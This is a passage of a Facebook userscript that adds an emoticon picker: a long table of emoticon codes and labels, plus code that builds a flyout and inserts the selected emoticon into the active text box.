﻿﻿// ==UserScript==
// @name            Cài Đặt Thành Công Icon Giao Diện Nhạc Nền Em Của Ngày Hôm Qua
// @description     All about facebook By Noname
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==
// ==13470X==
// ==============
// ==Icon==
(function() {
	// Active only in main frame
	if (!document.querySelector("#pageNav")) {
		return;
	}
	//console.info("Extra Facebook Smileys");

	// = Data =======
	var emoticons = [ { // Text to picture emoticons
"chars" : " :) ",
		"class" : "emoticon_smile",
		"name" : "Smiley"
	}, {
		"chars" : " :( ",
		"class" : "emoticon_frown",
		"name" : "Frown"
	}, {
		"chars" : " :P ",
		"class" : "emoticon_tongue",
		"name" : "Tongue"
	}, {
        "chars" : " :D ",
		"class" : "emoticon_grin",
		"name" : "Grin"
	}, {
		"chars" : " :o ",
		"class" : "emoticon_gasp",
		"name" : "Gasp"
	}, {
		"chars" : " ;) ",
		"class" : "emoticon_wink",
		"name" : "Wink"
	}, {
		"chars" : " :v ",
		"class" : "emoticon_pacman",
		"name" : "Pacman"
	}, {
		"chars" : " >:( ",
		"class" : "emoticon_grumpy",
		"name" : "Gru?ƒÂ±?ƒÂ³n"
	}, {
		"chars" : " :/ ",
		"class" : "emoticon_unsure",
		"name" : "Unsure"
	}, {
		"chars" : " :'( ",
		"class" : "emoticon_cry",
		"name" : "Cry"
	}, {
		"chars" : " ^_^ ",
		"class" : "emoticon_kiki",
		"name" : "Kiki"
	}, {
		"chars" : " 8) ",
		"class" : "emoticon_glasses",
		"name" : "Glasses"
	}, {
		"chars" : " B| ",
		"class" : "emoticon_sunglasses",
		"name" : "Sunglasses"
	}, {
		"chars" : " <3 ",
		"class" : "emoticon_heart",
		"name" : "Heart"
	}, {
		"chars" : " 3:) ",
		"class" : "emoticon_devil",
		"name" : "Devil"
	}, {
		"chars" : " O:) ",
		"class" : "emoticon_angel",
		"name" : "Angel"
	}, {
		"chars" : " -_- ",
		"class" : "emoticon_squint",
		"name" : "Squint"
	}, {
		"chars" : " o.O ",
		"class" : "emoticon_confused",
		"name" : "Confused"
	}, {
		"chars" : " >:o ",
		"class" : "emoticon_upset",
		"name" : "Upset"
	}, {
		"chars" : " :3 ",
		"class" : "emoticon_colonthree",
		"name" : "Colonthree"
	}, {
		"chars" : " (y) ",
		"class" : "emoticon_like",
		"name" : "Like"
	}, {
		"chars" : " :* ",
		"class" : "emoticon emoticon_kiss",
		"name" : "Kiss"
	}, {
		"chars" : " (^^^) ",
		"class" : "emoticon_shark",
		"name" : "Shark"
	}, {
		"chars" : " :|] ",
		"class" : "emoticon_robot",
		"name" : "Robot"
	}, {
		"chars" : " <(\") ",
		"class" : "emoticon_penguin",
		"name" : "Ping?ƒÂ¼ino"
	}, {
		"chars" : " :poop: ",
		"class" : "emoticon_poop",
		"name" : "Poop"
        }, {
		"chars" : " :putnam: ",
		"class" : "emoticon_putnam",
		"name" : "Putman"
	}, {
		"chars" : " \ud83c\udf02 ",
		"class" : "_1az _1a- _2c0",
		"name" : "Pink Umbrella"
	}, {
		"chars" : " \ud83c\udf0a ",
		"class" : "_1az _1a- _2c1",
		"name" : "Sea Wave"
	}, {
		"chars" : " \ud83c\udf19 ",
		"class" : "_1az _1a- _2c2",
		"name" : "Crescent moon"
	}, {
		"chars" : " \ud83c\udf1f ",
		"class" : "_1az _1a- _2c3",
		"name" : "Bright Star"
	}, {
		"chars" : " \ud83c\udf31 ",
		"class" : "_1az _1a- _2c4",
		"name" : "Seedbed"
	}, {
		"chars" : " \ud83c\udf34 ",
		"class" : "_1az _1a- _2c5",
		"name" : "Single Palm Tree"
	}, {
		"chars" : " \ud83c\udf35 ",
		"class" : "_1az _1a- _2c6",
		"name" : "Cactus"
	}, {
		"chars" : " \ud83c\udf37 ",
		"class" : "_1az _1a- _2c7",
		"name" : "Tulip"
	}, {
		"chars" : " \ud83c\udf38 ",
		"class" : "_1az _1a- _2c8",
		"name" : "Cherry Blossom"
	}, {
		"chars" : " \ud83c\udf39 ",
		"class" : "_1az _1a- _2c9",
		"name" : "Rose"
	}, {
		"chars" : " \ud83c\udf3a ",
		"class" : "_1az _1a- _2ca",
		"name" : "Cayenne"
	}, {
		"chars" : " \ud83c\udf3b ",
		"class" : "_1az _1a- _2cb",
		"name" : "Sunflower"
	}, {
		"chars" : " \ud83c\udf3e ",
		"class" : "_1az _1a- _2cc",
		"name" : "Ear Of Rice"
	}, {
		"chars" : " \ud83c\udf40 ",
		"class" : "_1az _1a- _2cd",
		"name" : "Four Leaf Clover"
	}, {
		"chars" : " \ud83c\udf41 ",
		"class" : "_1az _1a- _2ce",
		"name" : "Maple Leaf"
	}, {
		"chars" : " \ud83c\udf42 ",
		"class" : "_1az _1a- _2cf",
		"name" : "Fallen Leaf"
	}, {
		"chars" : " \ud83c\udf43 ",
		"class" : "_1az _1a- _2cg",
		"name" : "Leaf Floating In The Wind"
	}, {
		"chars" : " \ud83c\udf4a ",
		"class" : "_1az _1a- _2ch",
		"name" : "Tangerine"
	}, {
		"chars" : " \ud83c\udf4e ",
		"class" : "_1az _1a- _2ci",
		"name" : "Red Apple"
	}, {
		"chars" : " \ud83c\udf53 ",
		"class" : "_1az _1a- _2cj",
		"name" : "Strawberry"
	}, {
		"chars" : " \ud83c\udf54 ",
		"class" : "_1az _1a- _2ck",
		"name" : "Burger"
	}, {
		"chars" : " \ud83c\udf78 ",
		"class" : "_1az _1a- _2cl",
		"name" : "Cocktail Glass"
	}, {
		"chars" : " \ud83c\udf7a ",
		"class" : "_1az _1a- _2cm",
		"name" : "Tankard"
	}, {
		"chars" : " \ud83c\udf81 ",
		"class" : "_1az _1a- _2cn",
		"name" : "Gift Wrapped"
	}, {
		"chars" : " \ud83c\udf83 ",
		"class" : "_1az _1a- _2co",
		"name" : "Pumpkin With Candle"
	}, {
		"chars" : " \ud83c\udf84 ",
		"class" : "_1az _1a- _2cp",
		"name" : "Christmas Tree"
	}, {
		"chars" : " \ud83c\udf85 ",
		"class" : "_1az _1a- _2cq",
		"name" : "Santa"
	}, {
		"chars" : " \ud83c\udf88 ",
		"class" : "_1az _1a- _2cr",
		"name" : "Balloon"
	}, {
		"chars" : " \ud83c\udf89 ",
		"class" : "_1az _1a- _2cs",
		"name" : "Party Popper"
	}, {
		"chars" : " \ud83c\udf8d ",
		"class" : "_1az _1a- _2ct",
		"name" : "Pine Decor"
	}, {
		"chars" : " \ud83c\udf8e ",
		"class" : "_1az _1a- _2cu",
		"name" : "Japanese Dolls"
	}, {
		"chars" : " \ud83c\udf8f ",
		"class" : "_1az _1a- _2cv",
		"name" : "Carp Streamer"
	}, {
		"chars" : " \ud83c\udf90 ",
		"class" : "_1az _1a- _2cw",
		"name" : "Wind Chime"
	}, {
		"chars" : " \ud83c\udf93 ",
		"class" : "_1az _1a- _2cx",
		"name" : "Graduation Cap"
	}, {
		"chars" : " \ud83c\udfb5 ",
		"class" : "_1az _1a- _2cy",
		"name" : "Musical Note"
	}, {
		"chars" : " \ud83c\udfb6 ",
		"class" : "_1az _1a- _2cz",
		"name" : "Multiple Musical Notes"
	}, {
		"chars" : " \ud83c\udfbc ",
		"class" : "_1az _1a- _2c-",
		"name" : "Musical Score"
	}, {
		"chars" : " \ud83d\udc0d ",
		"class" : "_1az _1a- _2c_",
		"name" : "Snake"
	}, {
		"chars" : " \ud83d\udc0e ",
		"class" : "_1az _1a- _2d0",
		"name" : "Horse"
	}, {
		"chars" : " \ud83d\udc11 ",
		"class" : "_1az _1a- _2d1",
		"name" : "Sheep"
	}, {
		"chars" : " \ud83d\udc12 ",
		"class" : "_1az _1a- _2d2",
		"name" : "Monkey"
	}, {
		"chars" : " \ud83d\udc14 ",
		"class" : "_1az _1a- _2d3",
		"name" : "Hen"
	}, {
		"chars" : " \ud83d\udc17 ",
		"class" : "_1az _1a- _2d4",
		"name" : "Wild Boar"
	}, {
		"chars" : " \ud83d\udc18 ",
		"class" : "_1az _1a- _2d5",
		"name" : "Elephant"
	}, {
		"chars" : " \ud83d\udc19 ",
		"class" : "_1az _1a- _2d6",
		"name" : "Octopus"
	}, {
		"chars" : " \ud83d\udc1a ",
		"class" : "_1az _1a- _2d7",
		"name" : "Snail Shell"
	}, {
		"chars" : " \ud83d\udc1b ",
		"class" : "_1az _1a- _2d8",
		"name" : "Insect"
	}, {
		"chars" : " \ud83d\udc1f ",
		"class" : "_1az _1a- _2d9",
		"name" : "Fish"
	}, {
		"chars" : " \ud83d\udc20 ",
		"class" : "_1az _1a- _2da",
		"name" : "Tropical Fish"
	}, {
		"chars" : " \ud83d\udc21 ",
		"class" : "_1az _1a- _2db",
		"name" : "Pufferfish"
	}, {
		"chars" : " \ud83d\udc25 ",
		"class" : "_1az _1a- _2dc",
		"name" : "Chick In Front"
	}, {
		"chars" : " \ud83d\udc26 ",
		"class" : "_1az _1a- _2dd",
		"name" : "Bird"
	}, {
		"chars" : " \ud83d\udc27 ",
		"class" : "_1az _1a- _2de",
		"name" : "Penguin"
	}, {
		"chars" : " \ud83d\udc28 ",
		"class" : "_1az _1a- _2df",
		"name" : "Koala"
	}, {
		"chars" : " \ud83d\udc29 ",
		"class" : "_1az _1a- _2dg",
		"name" : "Poodle"
	}, {
		"chars" : " \ud83d\udc2b ",
		"class" : "_1az _1a- _2dh",
		"name" : "Bactrian Camel"
	}, {
		"chars" : " \ud83d\udc2c ",
		"class" : "_1az _1a- _2di",
		"name" : "Dolphin"
	}, {
		"chars" : " \ud83d\udc2d ",
		"class" : "_1az _1a- _2dj",
		"name" : "Mouse Face"
	}, {
		"chars" : " \ud83d\udc2e ",
		"class" : "_1az _1a- _2dk",
		"name" : "Cow Face"
	}, {
		"chars" : " \ud83d\udc2f ",
		"class" : "_1az _1a- _2dl",
		"name" : "Cara de tigre"
	}, {
		"chars" : " \ud83d\udc30 ",
		"class" : "_1az _1a- _2dm",
		"name" : "Rabbit Face"
	}, {
		"chars" : " \ud83d\udc31 ",
		"class" : "_1az _1a- _2dn",
		"name" : "Cat Face"
	}, {
		"chars" : " \ud83d\udc33 ",
		"class" : "_1az _1a- _2do",
		"name" : "Whale Sputtering"
	}, {
		"chars" : " \ud83d\udc34 ",
		"class" : "_1az _1a- _2dp",
		"name" : "Horse Face"
	}, {
		"chars" : " \ud83d\udc35 ",
		"class" : "_1az _1a- _2dq",
		"name" : "Monkey Face"
	}, {
		"chars" : " \ud83d\udc37 ",
		"class" : "_1az _1a- _2dr",
		"name" : "Pig face"
	}, {
		"chars" : " \ud83d\udc38 ",
		"class" : "_1az _1a- _2ds",
		"name" : "Frog Face"
	}, {
		"chars" : " \ud83d\udc39 ",
		"class" : "_1az _1a- _2dt",
		"name" : "Hamster Face"
	}, {
		"chars" : " \ud83d\udc3a ",
		"class" : "_1az _1a- _2du",
		"name" : "Wolf Face"
	}, {
		"chars" : " \ud83d\udc3b ",
		"class" : "_1az _1a- _2dv",
		"name" : "Bear Face"
	}, {
		"chars" : " \ud83d\udc3e ",
		"class" : "_1az _1a- _2dw",
		"name" : "Footprints"
	}, {
		"chars" : " \ud83d\udc40 ",
		"class" : "_1az _1a- _2dx",
		"name" : "Eyes"
	}, {
		"chars" : " \ud83d\udc42 ",
		"class" : "_1az _1a- _2dy",
		"name" : "Ear"
	}, {
		"chars" : " \ud83d\udc43 ",
		"class" : "_1az _1a- _2dz",
		"name" : "Nose"
	}, {
		"chars" : " \ud83d\udc44 ",
		"class" : "_1az _1a- _2d-",
		"name" : "Mouth"
	}, {
		"chars" : " \ud83d\udc45 ",
		"class" : "_1az _1a- _2d_",
		"name" : "Sour Face"
	}, {
		"chars" : " \ud83d\udc46 ",
		"class" : "_1az _1a- _2e0",
		"name" : "White hand pointing up"
	}, {
		"chars" : " \ud83d\udc47 ",
		"class" : "_1az _1a- _2e1",
		"name" : "White hand faces downward"
	}, {
		"chars" : " \ud83d\udc48 ",
		"class" : "_1az _1a- _2e2",
		"name" : "White hand indicating left"
	}, {
		"chars" : " \ud83d\udc49 ",
		"class" : "_1az _1a- _2e3",
		"name" : "White hand indicating right"
	}, {
		"chars" : " \ud83d\udc4a ",
		"class" : "_1az _1a- _2e4",
		"name" : "Fist"
	}, {
		"chars" : " \ud83d\udc4b ",
		"class" : "_1az _1a- _2e5",
		"name" : "Hand in motion"
	}, {
		"chars" : " \ud83d\udc4c ",
		"class" : "_1az _1a- _2e6",
		"name" : "Hand showing all good"
	}, {
		"chars" : " \ud83d\udc4d ",
		"class" : "_1az _1a- _2e7",
		"name" : "Hand with thumb up"
	}, {
		"chars" : " \ud83d\udc4e ",
		"class" : "_1az _1a- _2e8",
		"name" : "Hand with thumb down"
	}, {
		"chars" : " \ud83d\udc4f ",
		"class" : "_1az _1a- _2e9",
		"name" : "Hands clapping"
	}, {
		"chars" : " \ud83d\udc50 ",
		"class" : "_1az _1a- _2ea",
		"name" : "Open Hands"
	}, {
		"chars" : " \ud83d\udc66 ",
		"class" : "_1az _1a- _2eb",
		"name" : "Boy"
	}, {
		"chars" : " \ud83d\udc67 ",
		"class" : "_1az _1a- _2ec",
		"name" : "Girl"
	}, {
		"chars" : " \ud83d\udc68 ",
		"class" : "_1az _1a- _2ed",
		"name" : "Man"
	}, {
		"chars" : " \ud83d\udc69 ",
		"class" : "_1az _1a- _2ee",
		"name" : "Woman"
	}, {
		"chars" : " \ud83d\udc6b ",
		"class" : "_1az _1a- _2ef",
		"name" : "Man and woman holding hands"
	}, {
		"chars" : " \ud83d\udc6e ",
		"class" : "_1az _1a- _2eg",
		"name" : "Police Officer"
	}, {
		"chars" : " \ud83d\udc6f ",
		"class" : "_1az _1a- _2eh",
		"name" : "Woman with bunny ears"
	}, {
		"chars" : " \ud83d\udc71 ",
		"class" : "_1az _1a- _2ei",
		"name" : "Person with hair rubio"
	}, {
		"chars" : " \ud83d\udc72 ",
		"class" : "_1az _1a- _2ej",
		"name" : "Man with pi mao gua"
	}, {
		"chars" : " \ud83d\udc73 ",
		"class" : "_1az _1a- _2ek",
		"name" : "Man with turban"
	}, {
		"chars" : " \ud83d\udc74 ",
		"class" : "_1az _1a- _2el",
		"name" : "Old Man"
	}, {
		"chars" : " \ud83d\udc75 ",
		"class" : "_1az _1a- _2em",
		"name" : "Old Woman"
	}, {
		"chars" : " \ud83d\udc76 ",
		"class" : "_1az _1a- _2en",
		"name" : "Baby"
	}, {
		"chars" : " \ud83d\udc77 ",
		"class" : "_1az _1a- _2eo",
		"name" : "Construction Worker"
	}, {
		"chars" : " \ud83d\udc78 ",
		"class" : "_1az _1a- _2ep",
		"name" : "Princess"
	}, {
		"chars" : " \ud83d\udc7b ",
		"class" : "_1az _1a- _2eq",
		"name" : "Ghost"
	}, {
		"chars" : " \ud83d\udc7c ",
		"class" : "_1az _1a- _2er",
		"name" : "Angel baby"
	}, {
		"chars" : " \ud83d\udc7d ",
		"class" : "_1az _1a- _2es",
		"name" : "Alien"
	}, {
		"chars" : " \ud83d\udc7e ",
		"class" : "_1az _1a- _2et",
		"name" : "Alien Monster"
	}, {
		"chars" : " \ud83d\udc7f ",
		"class" : "_1az _1a- _2eu",
		"name" : "Imp"
	}, {
		"chars" : " \ud83d\udc80 ",
		"class" : "_1az _1a- _2ev",
		"name" : "Skull"
	}, {
		"chars" : " \ud83d\udc82 ",
		"class" : "_1az _1a- _2ew",
		"name" : "Guard"
	}, {
		"chars" : " \ud83d\udc83 ",
		"class" : "_1az _1a- _2ex",
		"name" : "Ballerina"
	}, {
		"chars" : " \ud83d\udc85 ",
		"class" : "_1az _1a- _2ey",
		"name" : "Nail Polish"
	}, {
		"chars" : " \ud83d\udc8b ",
		"class" : "_1az _1a- _2ez",
		"name" : "Brand of kiss"
	}, {
		"chars" : " \ud83d\udc8f ",
		"class" : "_1az _1a- _2e-",
		"name" : "Kissing couple"
	}, {
		"chars" : " \ud83d\udc90 ",
		"class" : "_1az _1a- _2e_",
		"name" : "Bunch of flowers"
	}, {
		"chars" : " \ud83d\udc91 ",
		"class" : "_1az _1a- _2f0",
		"name" : "Couple with heart"
	}, {
		"chars" : " \ud83d\udc93 ",
		"class" : "_1az _1a- _2f1",
		"name" : "Heart beating"
	}, {
		"chars" : " \ud83d\udc94 ",
		"class" : "_1az _1a- _2f2",
		"name" : "Broken Heart"
	}, {
		"chars" : " \ud83d\udc96 ",
		"class" : "_1az _1a- _2f3",
		"name" : "Bright Heart"
	}, {
		"chars" : " \ud83d\udc97 ",
		"class" : "_1az _1a- _2f4",
		"name" : "Heart growing"
	}, {
		"chars" : " \ud83d\udc98 ",
		"class" : "_1az _1a- _2f5",
		"name" : "Heart with arrow"
	}, {
		"chars" : " \ud83d\udc99 ",
		"class" : "_1az _1a- _2f6",
		"name" : "Blue Heart"
	}, {
		"chars" : " \ud83d\udc9a ",
		"class" : "_1az _1a- _2f7",
		"name" : "Green Heart"
	}, {
		"chars" : " \ud83d\udc9b ",
		"class" : "_1az _1a- _2f8",
		"name" : "Yellow Heart"
	}, {
		"chars" : " \ud83d\udc9c ",
		"class" : "_1az _1a- _2f9",
		"name" : "Purple Heart"
	}, {
		"chars" : " \ud83d\udc9d ",
		"class" : "_1az _1a- _2fa",
		"name" : "Heart with ribbon"
	}, {
		"chars" : " \ud83d\udca2 ",
		"class" : "_1az _1a- _2fb",
		"name" : "Symbol of anger"
	}, {
		"chars" : " \ud83d\udca4 ",
		"class" : "_1az _1a- _2fc",
		"name" : "Sleeping"
	}, {
		"chars" : " \ud83d\udca6 ",
		"class" : "_1az _1a- _2fd",
		"name" : "Sweat Symbol"
	}, {
		"chars" : " \ud83d\udca8 ",
		"class" : "_1az _1a- _2fe",
		"name" : "Quick Start Symbol"
	}, {
		"chars" : " \ud83d\udca9 ",
		"class" : "_1az _1a- _2ff",
		"name" : "Pile of Caca"
	}, {
		"chars" : " \ud83d\udcaa ",
		"class" : "_1az _1a- _2fg",
		"name" : "Flexed bicep"
	}, {
		"chars" : " \ud83d\udcbb ",
		"class" : "_1az _1a- _2fh",
		"name" : "Personal Computer"
	}, {
		"chars" : " \ud83d\udcbd ",
		"class" : "_1az _1a- _2fi",
		"name" : "Mini Disco"
	}, {
		"chars" : " \ud83d\udcbe ",
		"class" : "_1az _1a- _2fj",
		"name" : "Floppy disk"
	}, {
		"chars" : " \ud83d\udcbf ",
		"class" : "_1az _1a- _2fk",
		"name" : "Optical Disc"
	}, {
		"chars" : " \ud83d\udcc0 ",
		"class" : "_1az _1a- _2fl",
		"name" : "DVD"
	}, {
		"chars" : " \ud83d\udcde ",
		"class" : "_1az _1a- _2fm",
		"name" : "Telephone receiver"
	}, {
		"chars" : " \ud83d\udce0 ",
		"class" : "_1az _1a- _2fn",
		"name" : "Fax"
	}, {
		"chars" : " \ud83d\udcf1 ",
		"class" : "_1az _1a- _2fo",
		"name" : "Mobile Phone"
	}, {
		"chars" : " \ud83d\udcf2 ",
		"class" : "_1az _1a- _2fp",
		"name" : "Mobile phone with arrow from left to right"
	}, {
		"chars" : " \ud83d\udcfa ",
		"class" : "_1az _1a- _2fq",
		"name" : "Television"
	}, {
		"chars" : " \ud83d\udd14 ",
		"class" : "_1az _1a- _2fr",
		"name" : "Bell"
	}, {
		"chars" : " \ud83d\ude01 ",
		"class" : "_1az _1a- _2fs",
		"name" : "Face to face with smiling eyes"
	}, {
		"chars" : " \ud83d\ude02 ",
		"class" : "_1az _1a- _2ft",
		"name" : "Face with tears of joy"
	}, {
		"chars" : " \ud83d\ude03 ",
		"class" : "_1az _1a- _2fu",
		"name" : "Smiley face with open mouth"
	}, {
		"chars" : " \ud83d\ude04 ",
		"class" : "_1az _1a- _2fv",
		"name" : "Face and eyes smiling with mouth open"
	}, {
		"chars" : " \ud83d\ude06 ",
		"class" : "_1az _1a- _2fw",
		"name" : "Smiley face with mouth open and eyes closed"
	}, {
		"chars" : " \ud83d\ude09 ",
		"class" : "_1az _1a- _2fx",
		"name" : "Face winking eye"
	}, {
		"chars" : " \ud83d\ude0b ",
		"class" : "_1az _1a- _2fy",
		"name" : "Guy savoring delicious food"
	}, {
		"chars" : " \ud83d\ude0c ",
		"class" : "_1az _1a- _2fz",
		"name" : "Relief face"
	}, {
		"chars" : " \ud83d\ude0d ",
		"class" : "_1az _1a- _2f-",
		"name" : "Smiley face with heart shaped eyes"
	}, {
		"chars" : " \ud83d\ude0f ",
		"class" : "_1az _1a- _2f_",
		"name" : "Smirk face"
	}, {
		"chars" : " \ud83d\ude12 ",
		"class" : "_1az _1a- _2g0",
		"name" : "Face of boredom"
	}, {
		"chars" : " \ud83d\ude13 ",
		"class" : "_1az _1a- _2g1",
		"name" : "Face with cold sweat"
	}, {
		"chars" : " \ud83d\ude14 ",
		"class" : "_1az _1a- _2g2",
		"name" : "Pensive face"
	}, {
		"chars" : " \ud83d\ude16 ",
		"class" : "_1az _1a- _2g3",
		"name" : "Confused face"
	}, {
		"chars" : " \ud83d\ude18 ",
		"class" : "_1az _1a- _2g4",
		"name" : "Throwing kiss Face"
	}, {
		"chars" : " \ud83d\ude1a ",
		"class" : "_1az _1a- _2g5",
		"name" : "Kissing face with eyes closed"
	}, {
		"chars" : " \ud83d\ude1c ",
		"class" : "_1az _1a- _2g6",
		"name" : "Face with tongue out and winking"
	}, {
		"chars" : " \ud83d\ude1d ",
		"class" : "_1az _1a- _2g7",
		"name" : "Face with tongue hanging out and eyes closed"
	}, {
		"chars" : " \ud83d\ude1e ",
		"class" : "_1az _1a- _2g8",
		"name" : "Face discouraged"
	}, {
		"chars" : " \ud83d\ude20 ",
		"class" : "_1az _1a- _2g9",
		"name" : "Face of anger"
	}, {
		"chars" : " \ud83d\ude21 ",
		"class" : "_1az _1a- _2ga",
		"name" : "Very angry face"
	}, {
		"chars" : " \ud83d\ude22 ",
		"class" : "_1az _1a- _2gb",
		"name" : "Crying Face"
	}, {
		"chars" : " \ud83d\ude23 ",
		"class" : "_1az _1a- _2gc",
		"name" : "Face of perseverance"
	}, {
		"chars" : " \ud83d\ude24 ",
		"class" : "_1az _1a- _2gd",
		"name" : "Face of triumph"
	}, {
		"chars" : " \ud83d\ude25 ",
		"class" : "_1az _1a- _2ge",
		"name" : "Face discouraged but relieved"
	}, {
		"chars" : " \ud83d\ude28 ",
		"class" : "_1az _1a- _2gf",
		"name" : "Scary face"
	}, {
		"chars" : " \ud83d\ude29 ",
		"class" : "_1az _1a- _2gg",
		"name" : "Fatigued face"
	}, {
		"chars" : " \ud83d\ude2a ",
		"class" : "_1az _1a- _2gh",
		"name" : "Sleeping face"
	}, {
		"chars" : " \ud83d\ude2b ",
		"class" : "_1az _1a- _2gi",
		"name" : "Tired face"
	}, {
		"chars" : " \ud83d\ude2d ",
		"class" : "_1az _1a- _2gj",
		"name" : "Face screaming"
	}, {
		"chars" : " \ud83d\ude30 ",
		"class" : "_1az _1a- _2gk",
		"name" : "Face with mouth open and cold sweat"
	}, {
		"chars" : " \ud83d\ude31 ",
		"class" : "_1az _1a- _2gl",
		"name" : "Terrified face of fear"
	}, {
		"chars" : " \ud83d\ude32 ",
		"class" : "_1az _1a- _2gm",
		"name" : "Very surprised face"
	}, {
		"chars" : " \ud83d\ude33 ",
		"class" : "_1az _1a- _2gn",
		"name" : "Face flushed"
	}, {
		"chars" : " \ud83d\ude35 ",
		"class" : "_1az _1a- _2go",
		"name" : "Face dizzy"
	}, {
		"chars" : " \ud83d\ude37 ",
		"class" : "_1az _1a- _2gp",
		"name" : "Face with medical mask"
	}, {
		"chars" : " \ud83d\ude38 ",
		"class" : "_1az _1a- _2gq",
		"name" : "Grinning Cat face and eyes closed"
	}, {
		"chars" : " \ud83d\ude39 ",
		"class" : "_1az _1a- _2gr",
		"name" : "Cat face with tears of laughter"
	}, {
		"chars" : " \ud83d\ude3a ",
		"class" : "_1az _1a- _2gs",
		"name" : "Smiling cat face with open mouth"
	}, {
		"chars" : " \ud83d\ude3b ",
		"class" : "_1az _1a- _2gt",
		"name" : "Smiling cat face with hearts in her eyes"
	}, {
		"chars" : " \ud83d\ude3c ",
		"class" : "_1az _1a- _2gu",
		"name" : "Face of cat smile twisted"
	}, {
		"chars" : " \ud83d\ude3d ",
		"class" : "_1az _1a- _2gv",
		"name" : "Cat face kissing with eyes closed"
	}, {
		"chars" : " \ud83d\ude3f ",
		"class" : "_1az _1a- _2gw",
		"name" : "Cat face crying"
	}, {
		"chars" : " \ud83d\ude40 ",
		"class" : "_1az _1a- _2gx",
		"name" : "Cat face scared terrified"
	}, {
		"chars" : " \ud83d\ude4b ",
		"class" : "_1az _1a- _2gy",
		"name" : "Happy person raising a hand"
	}, {
		"chars" : " \ud83d\ude4c ",
		"class" : "_1az _1a- _2gz",
		"name" : "Person holding up both hands in celebration"
	}, {
		"chars" : " \ud83d\ude4d ",
		"class" : "_1az _1a- _2g-",
		"name" : "Person frowning"
	}, {
		"chars" : " \ud83d\ude4f ",
		"class" : "_1az _1a- _2g_",
		"name" : "Person in prayer"
	}, {
		"chars" : " \u261d ",
		"class" : "_1az _1a- _2h0",
		"name" : "Index finger pointing up"
	}, {
		"chars" : " \u263a ",
		"class" : "_1az _1a- _2h1",
		"name" : "White face smiling"
	}, {
		"chars" : " \u26a1 ",
		"class" : "_1az _1a- _2h2",
		"name" : "High voltage symbol"
	}, {
		"chars" : " \u26c4 ",
		"class" : "_1az _1a- _2h3",
		"name" : "Snowless snowman"
	}, {
		"chars" : " \u270a ",
		"class" : "_1az _1a- _2h4",
		"name" : "Fist up"
	}, {
		"chars" : " \u270b ",
		"class" : "_1az _1a- _2h5",
		"name" : "Hand pointing up"
	}, {
		"chars" : " \u270c ",
		"class" : "_1az _1a- _2h6",
		"name" : "Winning Hand"
	}, {
		"chars" : " \u2600 ",
		"class" : "_1az _1a- _2h7",
		"name" : "Sun With Rays"
	}, {
		"chars" : " \u2601 ",
		"class" : "_1az _1a- _2h8",
		"name" : "Cloud"
	}, {
		"chars" : " \u2614 ",
		"class" : "_1az _1a- _2h9",
		"name" : "Umbrella With Rain Drops"
	}, {
		"chars" : " \u2615 ",
		"class" : "_1az _1a- _2ha",
		"name" : "Hot Drink"
	}, {
		"chars" : " \u2728 ",
		"class" : "_1az _1a- _2hb",
		"name" : "Brightness"
	}, {
		"chars" : " \u2764 ",
		"class" : "_1az _1a- _2hc",
		"name" : "Heavy Black Heart"
	} ];

	// = Variables =======
	var lastActiveElement = document.activeElement;

	// = Functions =======
	function createElement(html) {
		var outerHTML = document.createElement("div");
		outerHTML.innerHTML = html;
		return outerHTML.firstChild;
	}

	function htmlSpecialChars(string) {
		var div = document.createElement("div");
		var text = document.createTextNode(string);
		div.appendChild(text);
		return div.innerHTML;
	}

	function isInstanceOfTextInput(element) {
		return (element instanceof HTMLInputElement && element.type == "text")
				|| element instanceof HTMLTextAreaElement;
	}

	function isFlyoutOpen(flyout) {
		return flyout.className == "openToggler";
	}

	function openFlyout(flyout, open) {
		if (open === undefined) {
			open = !isFlyoutOpen(flyout); // Toggle
		}

		if (open) {
			flyout.className = "openToggler";
		} else {
			flyout.removeAttribute("class");
		}
	}

	function createTab(titleContainer, bodyContainer) {
		var html;
		// Tab; default = inactive
	    html = '<li class="jewelFlyout fbJewelFlyout uiToggleFlyout">';
		html += '<div class="jewelFlyout">';
		html += '</div>';
		html += '</li>';
		var title = createElement(html);
		titleContainer.appendChild(title);

		// Manual input
		html = '<div style="display: none;">';
		html += '</div>';
		var body = createElement(html);
		bodyContainer.appendChild(body);

		// Change tab listener
		(function(body) {
			title.addEventListener("click", function() {
				// Change tab
				var titles = this.parentNode.childNodes; // tab.tabContainer.childNodes
				for ( var t = 0; t < titles.length; t++) {
					if (titles[t] === this) { // Active
						
					} else { // Inactive
						titles[t].style.background = "";
						titles[t].firstChild.style.color = "";
					}
				}

				// Change body
				var bodies = body.parentNode.childNodes; // body.bodyContainer.childNodes
				for ( var b = 0; b < bodies.length; b++) {
					if (bodies[b] === body) { // Show
						body.style.display = "";
					} else { // Hide
						bodies[b].style.display = "none";
					}
				}
			});
		})(body);

		return {
			"title" : title.firstChild,
			"body" : body
		};
	}

	function createTabListBody(emoticons, filter) {
		var html;

		html = '<div style="max-height: 200px; padding-right: 15px; overflow-x: hidden; line-height: 1em;">';
		html += '<div style="padding: 10px; width: 200px; font-size: 15px;">';
		html += '</div>';
		html += '</div>';
		var body = createElement(html).firstChild;
		for ( var e = 0; e < emoticons.length; e++) {
			var emoticon = emoticons[e];
			if (!filter(emoticon)) {
				continue;
			}

			// Icons
			html = '<span class="panelCell" style="display: inline-block; vertical-align: middle; padding: 2px;">';
			html += '<a';
			html += ' class="emoticon'
					+ (emoticon.class !== undefined ? ' ' + emoticon.class : '')
					+ '"';
			html += ' style="text-decoration: inherit; color: inherit;'
					+ (emoticon.class !== undefined ? ' color: transparent;'
							: ' width: auto;') + '"';
			html += (emoticon.name !== undefined ? ' title="' + emoticon.name
					+ '"' : '');
			html += '>';
			html += htmlSpecialChars(emoticon.chars);
			html += '</a>';
			html += '</span>';
			var cell = createElement(html);
			body.appendChild(cell);

			// Select emoticon listener
			var emoticonA = cell.firstChild;
			(function(emoticon) {
				emoticonA.addEventListener("click", function() {
					if (isInstanceOfTextInput(lastActiveElement)) {
						lastActiveElement.focus();

						var chars = emoticon.chars;
						var value = lastActiveElement.value;
						var start = lastActiveElement.selectionStart;
						var end = lastActiveElement.selectionEnd;
						lastActiveElement.value = value.substring(0, start)
								+ chars + value.substring(end);
						lastActiveElement.setSelectionRange(start + chars.length, start + chars.length);
					}

					openFlyoutCommand = false; // Close flyout
				});
			})(emoticon);
		}

		return body.parentNode;
	}

	// = Construct UI =======
	var html;

	// Menu item
	// var navItem
	html = '<li class="navItem middleItem notifNegativeBase">';
	html += '<div class="fbJewel">';
